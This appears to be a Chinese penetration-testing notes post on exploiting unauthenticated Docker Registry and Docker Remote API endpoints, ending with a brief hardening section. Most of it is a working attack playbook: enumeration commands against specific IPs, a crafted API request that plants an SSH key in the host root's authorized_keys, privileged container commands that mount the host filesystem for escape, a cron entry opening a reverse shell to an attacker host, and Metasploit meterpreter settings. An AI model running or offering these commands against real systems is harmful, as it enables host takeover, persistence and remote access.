---
title: Docker
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2020-12-09 15:53:15
top:
tags:
layout:
---
编写进度
- [x]  信息收集
- [x]  漏洞利用

Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。


## Docker Registry API未授权访问
[Registry API]: https://docs.docker.com/registry/spec/api/

更多用法参考[Registry API]

### Nmap探测
```zsh
 nmap -Pn -T4  -sV -p 18093 10.200.88.6                                                                          130 ↵
Nmap scan report for 10.200.88.6
Host is up (0.067s latency).

PORT      STATE SERVICE VERSION
18093/tcp open  http    Docker Registry (API: 2.0)

```
### 利用
```zsh
curl http://10.200.88.6:18093/v2/_catalog  # 获取仓库列表
{"repositories":["ondp-web"]}

curl http://10.200.88.6:18093/v2/ondp-web/tags/list  # 获取指定仓库中镜像的tags列表
{"name":"ondp-web","tags":["1.1.0-61752"]}

```



## Docker Remote API未授权访问

Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和  1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建  container，删除已有 container，甚至是获取宿主机的 shell。

### 信息收集

#### 端口信息

```zsh
nmap -Pn -T4  -sV -p 2375  192.168.79.207                                                                                                             
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:34 CST
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
2375/tcp open  docker  Docker 19.03.13

Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
```

#### docker版本、容器信息

- 通过curl命令查看

```zsh
curl 'http://192.168.79.207:2375/version'       # 查看docker运行的版本信息                                                                                                                
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.13","Details": ...
{"GitCommit":"fec3683"}}],"Version":"19.03.13","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"4484c46d9d","GoVersion":"go1.13.15","Os":"linux","Arch":"amd64","KernelVersion":"4.15.0-29-generic","BuildTime":"2020-09-16T17:01:06.000000000+00:00"}

curl 'http://192.168.79.207:2375/<容器id>/info'       # 查看容器运行的信息                                                                                                                

curl 'http://192.168.79.207:2375/containers/json?all=1'  # 获取全部容器列表
[{"Id":"68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545","Names":["/reverent_bell"],"Image":"ubuntu:18.04","ImageID":"sha256:2c047404e52d7f17bdac4121a13cd844447b74e13063f8cb8f8b314467feed06","Command":"sh -c 'echo /dev/null'","Created":1607475496,"Ports":[],"Labels":{},"State":"running","Status":"Up 4 hours","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge": ...{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"5001dfbe94e8ad314a58ad790b10086d6accf0173bc1bfbc6d4e54d3e219ac24","EndpointID":"3903fce3838f4002ca8f7142f77ffca4779d6293d4f84b5ca28d4f481c1d9177","Gateway":"172.17.0.1","IPAddress":"172.17.0.7","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:07","DriverOpts":null}}},"Mounts":[]}]

curl 'http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/json'  # 查看具体容器的详细信息

curl 'http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/export'  # 导出具体的镜像

curl 'http://192.168.79.207:2375/images/json?all=1'  # 获取全部镜像列表

```

更多用法参考[Docker Remote API](https://docs.docker.com/engine/api/v1.24/#3-endpoints)

- 通过docker -H查看

```zsh
docker -H tcp://192.168.79.207 version  #查看docker版本信息
docker -H tcp://192.168.79.207 images  #查看目标机器的镜像


docker  -H tcp://192.168.79.207   ps -a   # 查看服务器运行的容器有哪些
CONTAINER ID        IMAGE                              COMMAND                  CREATED              STATUS                     PORTS               NAMES
8069f1b5cd72        5301ebcf503e                       "/bin/sh -c 'curl --…"   About a minute ago   Created                                        friendly_dhawan

```

### 漏洞利用

#### 运行新镜像并提权

- BurpSuite方式-不推荐
  - 创建容器，返回容器id
```zsh
POST /containers/create HTTP/1.1
Host: 192.168.79.207:2375
Content-Type: application/json
cache-control: no-cache
Postman-Token: 7abe8d48-2e9d-4245-a7a4-dbd66279705e
{
 "Image":"ubuntu:18.04",
 "HostConfig":{
 "Binds":[
 "/root/:/tmp/:rw" 
 ]
 },
 "CMD":[
 "/bin/sh",
 "-c",
 "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC6kYan1DO/mcdvu8WcYvmXbEh4WzHqy9k0yeoN0AY40Gg2tnP9TTDMHUWwT5EZk4+hkL7UMr+CMhjnqucZKX5Yw/GhF3kwQZN/NCu3GtJ3/Abl6G6y3J4ej0Q85kFPnPyIM5ZRygTqq728HaHWDgqwjqSG35Dh7pjuvIV8ULuekYpeFN607bEZ0lM3vt3/Kf/fBZQseZYSoj4/S+hWTmVivDThBGECcbCEpVACX3LLSqMvYEURUlEbE+f9qpLV1y7rSIQNJu3VsitHy2m7TAxScxAYsu3MhJFWYQVUZOlUEatW0Q3Ch9iLvD/H5rnBe+ps6088sp/P0CgzrElPChZ root@kali' >> /tmp/.ssh/authorized_keys"
 ]
}------WebKitFormBoundary7MA4YWxkTrZu0gW-- 
```
  - 连接容器

```zsh
POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/attach?stderr=1&stdin=1&stdout=1&stream=1 HTTP/1.1
Host: 172.26.1.97:2375
User-Agent: Docker-Client/1.7.0 (windows)
Content-Length: 0
Content-Type: application/json
Accept-Encoding: gzip
```

  - 启动容器
```zsh
POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/start HTTP/1.1
Host: 172.26.1.97:2375
User-Agent: Docker-Client/1.7.0 (windows)
Content-Length: 0
Content-Type: application/json
Accept-Encoding: gzip
```

- 命令行方式-推荐

```zsh
docker -H 10.211.55.13:2375 run --rm -it --privileged --net host -v /:/mnt alpine
docker  -H tcp://10.200.30.64:2375 run -it -v /:/mnt platform_of_check /bin/bash
docker -H tcp://192.168.79.207  run –rm –privileged -it -v /:/mnt busybox chroot /mnt --entrypoint sh  # 以宿主root的身份启动busybox容器,并将宿主根目录/挂载到busybox容器的/mnt目录下，并切换busybox的根目录为/mnt目录，最后运行sh命令
参数解释：
-rm 容器停止时自动删除该容器
--privileged 容器拥有宿主机的root权限
-it 开启tty终端
-v 挂载目录 格式为 宿主系统目录:容器目录. /:/mnt指将宿主系统根目录挂在到容器中的/mnt目录上
busybox 镜像名字 ,busybox体积小，同时命令齐全
chroot /mnt 将根目录切换到/mnt上   
--entrypoint sh 执行sh
```

- [docker_api_vul]

[docker_api_vul]: https://github.com/Tycx2ry/docker_api_vul

#### 写入定时任务
```zsh
docker -H tcp://192.168.79.207:2375 image  # 查看宿主机可用镜像
docker -H tcp://192.168.79.207:2375 run -it -v /var/spool/cron/:/var/spool/cron/ <image_id> /bin/bash   # 进入容器，并将宿主机/var/spool/cron/目录挂载到容器/var/spool/cron/目录下
root@bfd2539dfdc8:/# echo '* * * * * bash -i >& /dev/tcp/attack_ip/8088 0>&1' >> /var/spool/cron/root   # 写入反弹shell命令到定时任务中
```

### MSF相关模块
```zsh
msf6 exploit(linux/http/docker_daemon_tcp) > options

Module options (exploit/linux/http/docker_daemon_tcp):

   Name          Current Setting          Required  Description
   ----          ---------------          --------  -----------
   CONTAINER_ID                           no        container id you would like
   DOCKERIMAGE   alpine:latest            yes       hub.docker.com image to use
   Proxies       socks4://127.0.0.1:7891  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         2375                     yes       The target port (TCP)
   SSL           false                    no        Negotiate SSL/TLS for outgoing connections
   VHOST                                  no        HTTP server virtual host

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.79.207   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

### 漏洞修复

在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：
1. 设置ACL，仅允许信任的来源IP连接；
2. 修改docker swarm的认证方式，使用TLS认证

客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：
		
```zsh
docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://x.x.x.x:2375 -H unix:///var/run/docker.sock
```

客户端连接时需要设置以下环境变量

```zsh
export DOCKER_TLS_VERIFY=1
export DOCKER_CERT_PATH=~/.docker
export DOCKER_HOST=tcp://x.x.x.x:2375
export DOCKER_API_VERSION=1.12
```
